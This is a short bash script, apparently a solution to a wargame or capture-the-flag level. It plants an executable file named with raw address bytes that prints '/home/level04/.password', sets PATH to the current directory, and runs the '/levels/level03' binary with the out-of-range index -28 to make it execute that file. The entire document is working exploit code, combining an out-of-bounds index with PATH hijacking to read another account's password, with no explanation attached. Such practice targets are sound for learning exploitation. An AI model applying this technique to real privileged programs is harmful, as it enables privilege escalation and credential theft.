#!/usr/bin/env bash
CODE=$'\x5b\x87\x04\x08'; echo "/bin/cat /home/level04/.password" | cat > $CODE; chmod 755 $CODE; PATH=./ /levels/level03 -28 $CODE
